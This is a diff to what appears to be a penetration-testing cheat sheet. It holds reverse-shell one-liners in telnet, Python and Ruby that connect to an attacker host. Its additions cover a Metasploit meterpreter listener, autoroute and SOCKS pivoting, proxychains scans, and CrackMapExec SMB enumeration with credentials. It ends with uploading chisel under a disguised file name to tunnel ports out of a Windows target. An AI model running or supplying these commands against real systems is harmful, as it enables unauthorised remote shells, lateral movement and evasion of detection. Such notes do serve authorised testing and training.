@@ -33,7 +33,47 @@ rm -f /tmp/p; mknod /tmp/p p && telnet 123.123.123.1 1234 0/tmp/p
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("123.123.123.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 
-On listening host: nc -lvnp 1234
+On listening host: 
+nc -lvnp 1234
+
+Or set up a multi/handler listener on meterpreter:
+sudo msfconsole -q
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.12.34
+set LPORT 1234
+#If you want to keep the listener alive for new sessions, without restarting it every time:
+set ExitOnSession false
+#Start running the listener as a background job
+run -j
+
+----
+
+#If you want to use the previous as a proxy to touch stuff inside the target net:
+#Add route to routing table
+use multi/manage/autoroute
+set sesion 1
+run
+#Start proxying
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+#Using Socks5
+set VERSION 5
+#Run in background
+run -j
+#Make sure your /etc/proxychains4.conf contains: socks5  127.0.0.1 1080
+#Now you could nmap some IPs from the target network (needs -sT when using proxychains) or for example get basic SMB information and list
+#SMB shares + permissions (requires credentials) for the 4 IPs (one range and one singular) with CrackMapExec SMB module
+sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 22,80,443,8080 10.20.30.220 10.20.30.221 10.20.30.224
+proxychains -q crackmapexec smb 10.20.30.220-222 10.20.30.224 -u username -d testad.local -p "p4ssw0rd" --shares
+#At this point you could run a chisel server and transfer the chisel binary to a Windows target by:
+./chisel server -p 8888 --reverse
+sesssion -i 1
+upload /home/user/tools/chisel/chisel.exe c:\\Users\\targetuser\\definitely_not_chisel_here.exe
+#Then from the Windows host, by connection to chisel server on port 8888 and redirect the Windows host port 80 to 8008 on the host running chisel server: 
+definitely_not_chisel_here.exe client 192.168.12.34:8888 R:80:10.20.30.221:8008
+#If there was for example a httpd on port 80 on the Windows host, you could access it from the chisel server host through a browser: http://localhost:8008/
+#If there's any unreachable internal servers for the above you can just point those to 127.0.0.1 in your /etc/hosts to make them resolve and point to correct net.
 
 ----
 
